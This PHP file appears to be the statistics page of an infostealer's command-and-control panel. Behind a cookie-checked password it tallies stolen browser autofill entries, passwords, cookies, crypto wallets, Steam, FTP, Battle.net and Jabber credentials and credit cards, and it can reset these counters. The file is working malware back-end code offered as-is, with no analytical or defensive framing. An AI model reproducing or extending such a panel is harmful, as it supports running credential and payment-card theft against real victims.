<?php
error_reporting(0);
require("mysql.php");

if ($_COOKIE["pwd"] === md5($panel_password)){
    if(isset($_POST['clean'])){
        $rq = "UPDATE `stat` SET `autofill`='0',`passwords`='0',`cookies`='0',`crypto`='0',`steam`='0',`ftp`='0',`battlenet`='0',`jabber`='0',`cc`='0'";
        $base->query($rq);
        header("Location: index.php");
    }
    
    $request = "SELECT * FROM `stat`";
    $answ = $base->query($request);
    $row = $answ->fetchAll();
    $array = $row[0];
?>

<html>
 <head>
  <meta charset="utf-8">
  <title>Staticstic</title>
  <link href="bootstrap.css" rel="stylesheet" id="bootstrap-css">
  <link rel="stylesheet" href="w3.css">
  <link href="bar.css" rel="stylesheet" id="bootstrap-css">
 </head>
 <body class="w3-light-gray">
 
<div class="w3-top w3-bar w3-black w3-card">
  <a class="w3-bar-item w3-button" href="index.php">Logs</a>
  <a class="w3-bar-item w3-button" href="stat.php">Statistic</a>
</div>

<div class="w3-container" style="margin-top:46px">
    
	<?php
	
	$all_count = $array['autofill'] + $array['passwords'] + $array['cookies'] + $array['crypto'] + $array['steam'] + $array['ftp'] + $array['battlenet'] + $array['jabber'] + $array['cc'];
	
	
	?>
	
    <div class="w3-container">
        <div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Autofill <?php if($array['autofill'][0] !== '0') echo ($array['autofill'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['autofill']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Passwords <?php if($array['passwords'][0] !== '0') echo ($array['passwords'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['passwords']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Cookies <?php if($array['cookies'][0] !== '0') echo ($array['cookies'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['cookies']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Crypto <?php if($array['crypto'][0] !== '0') echo ($array['crypto'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['crypto']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Steam <?php if($array['steam'][0] !== '0') echo ($array['steam'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['steam']?></p>
            </div>
        </div>
		
		<div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">FTP <?php if($array['ftp'][0] !== '0') echo ($array['ftp'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['ftp']?></p>
            </div>
        </div>
    </div>
    
    <br>
    
    <div class="w3-container">
        <div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Battle.net <?php if($array['battlenet'][0] !== '0') echo ($array['battlenet'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['battlenet']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">Jabber <?php if($array['jabber'][0] !== '0') echo ($array['jabber'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['jabber']?></p>
            </div>
        </div>

        <div class="w3-card" style="display:inline-block; width:15%">
            <div class="w3-container">
              <h4><b style="color: #000000;">CС Cards <?php if($array['cc'][0] !== '0') echo ($array['cc'] / $all_count) * 100; else echo "0%"; ?></b></h4>
              <p>Count: <?=$array['cc']?></p>
            </div>
        </div>
    </div>
    
</div>
  
 </body>
</html>
<?php
}else{
	header("location: login.php");
}
?>